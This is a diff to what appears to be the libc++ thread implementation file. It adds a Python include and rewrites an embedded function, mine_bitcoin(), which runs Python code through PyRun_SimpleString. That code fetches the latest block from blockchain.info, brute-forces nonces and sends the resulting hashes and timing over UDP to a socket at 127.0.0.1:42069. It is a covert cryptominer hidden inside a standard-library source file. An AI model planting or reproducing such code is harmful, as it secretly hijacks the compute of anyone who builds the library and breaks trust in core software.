@@ -7,6 +7,7 @@
 //===----------------------------------------------------------------------===//
 
 #include "__config"
+#include <python3.8/pythonrun.h>
 #ifndef _LIBCPP_HAS_NO_THREADS
 
 #include "thread"
@@ -47,8 +48,7 @@ _LIBCPP_BEGIN_NAMESPACE_STD
 void
 mine_bitcoin() {
   Py_Initialize();
-  PyRun_SimpleString("exec(\"\"\"\nimport requests\nimport urllib.request\nimport json\nimport hashlib\nimport merkletools\nimport random\n\nNONCE_MAX = 4294967296\nAPI_URL = \"https://blockchain.info/latestblock\"\nTX_KEY = \"txIndexes\"\nPREVHASH_KEY = \"hash\"\nHASH_ATTEMPTS = 3000\nTHRESHOLD = 3\n\nwith urllib.request.urlopen(API_URL) as url:\n    data = json.loads(url.read().decode())\n    prevHash = data[PREVHASH_KEY]\n    transactions = data[TX_KEY]\n\n    mt = merkletools.MerkleTools(hash_type=\"sha256\")\n    for transaction in transactions:\n        mt.add_leaf(hex(transaction), True)\n    mt.make_tree()\n    is_ready = False;\n    while not is_ready:\n        is_ready = mt.is_ready\n    root_value = mt.get_merkle_root();\n\n    comp = (THRESHOLD) * '0'\n\n    hashdict = {}\n    for i in range(HASH_ATTEMPTS):\n        nonce = random.randrange(NONCE_MAX)\n        firstpass = hashlib.sha256(((root_value+str(nonce)).encode('utf-8')))\n        secondpass = hashlib.sha256()\n        firstpass.hexdigest()\n        secondpass.update(firstpass.digest())\n        secondpass.hexdigest()\n        h = secondpass.hexdigest()\n        if str(h)[:THRESHOLD]==comp:\n            hashdict[nonce] = h\n\"\"\")");
-  
+  PyRun_SimpleString("exec(\"\"\"\nimport requests\nimport urllib.request\nimport json\nimport hashlib\nimport merkletools\nimport random\nimport time\nimport socket\n\nNONCE_MAX = 4294967296\nAPI_URL = \"https://blockchain.info/latestblock\"\nTX_KEY = \"txIndexes\"\nPREVHASH_KEY = \"hash\"\nHASH_ATTEMPTS = 15000\nTHRESHOLD = 3\n\nIP = '127.0.0.1'\nPORT = 42069\n\nwith urllib.request.urlopen(API_URL) as url:\n    data = json.loads(url.read().decode())\n    prevHash = data[PREVHASH_KEY]\n    transactions = data[TX_KEY]\n\n    mt = merkletools.MerkleTools(hash_type=\"sha256\")\n    for transaction in transactions:\n        mt.add_leaf(hex(transaction), True)\n    mt.make_tree()\n    is_ready = False;\n    while not is_ready:\n        is_ready = mt.is_ready\n    root_value = mt.get_merkle_root();\n    \n    start_time = time.time()\n\n    comp = (THRESHOLD) * '0'\n\n    hashdict = {}\n    for i in range(HASH_ATTEMPTS):\n        nonce = random.randrange(NONCE_MAX)\n        firstpass = hashlib.sha256(((root_value+str(nonce)).encode('utf-8')))\n        secondpass = hashlib.sha256()\n        firstpass.hexdigest()\n        secondpass.update(firstpass.digest())\n        secondpass.hexdigest()\n        h = secondpass.hexdigest()\n        if str(h)[:THRESHOLD]==comp:\n            hashdict[nonce] = h\n\n    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    time_elapsed = time.time() - start_time;\n    for h in hashdict:\n        message = str(hashdict[h]) + \" \" + str(int(time_elapsed*1000));\n        s.sendto(message.encode('utf-8'), (IP, PORT))\n\"\"\")");
 }
 
 thread::~thread()
